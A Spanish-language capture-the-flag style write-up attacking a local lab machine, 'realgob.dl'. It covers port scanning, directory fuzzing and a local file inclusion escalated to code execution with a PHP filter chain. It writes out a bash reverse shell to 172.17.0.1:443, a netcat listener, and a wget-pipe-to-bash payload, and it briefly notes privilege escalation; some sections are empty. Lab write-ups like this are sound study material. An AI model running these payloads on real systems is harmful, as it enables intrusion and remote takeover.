# Maquina Report

### 1.- Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

### 2.- Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80,3306 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

### 3.- Fuzzing Web

agregaomos el realgob.dl al /etc/hosts

gobuster dir -t 200 -u http://realgob.dl/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

![alt text](image-3.png)

### 4.- Vulnerabilidades

#### - LFI

wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://realgob.dl/about.php?FUZZ=../../../../../../../../../../../../../etc/passwd" --hh=4919

![alt text](image-2.png)

Intenté sacar el id_rsa, ver los logs y no se pudo, entonces utilicé la herramienta php_filter_chain_generator

a.- Creamos una reverse shell llamada rev con el siguiente contenido:

nano rev

bash -i >& /dev/tcp/172.17.0.1/443 0>&1 

b.- Iniciamos un servidor web con python en la carpeta donde creamos el rev

python3 -m http.server 80

![alt text](image-4.png)

c.- Nos ponemos en escucha con netcat por el puerto 443

nc -nlvp 443

d. En la carpeta php_filter_chain_generator, ejecutamos

python3 php_filter_chain_generator.py --chain '<?=`wget -O- 172.17.0.1/rev|bash`?>'

![alt text](image-5.png)

e.- Pegamos el wrapper  en la url de esta manera:

ejemplo:

http://realgob.dl/about.php?file=wrapper

![alt text](image-6.png)

f.- Tenemos acceso

#### - Bypass php - JPEG - cambiando el Content - Type

#### - SQLi


### 5.- Escalar privilegios

ejecute el comando: find / -name '*.git' 2>/dev/null

![alt text](image-7.png)

![alt text](image-8.png)

siendo el usuario adm entramos en /home/adm y abrimos el .bashrc

![alt text](image-10.png)

lo crakeamos con cyberchef

![alt text](image-9.png)

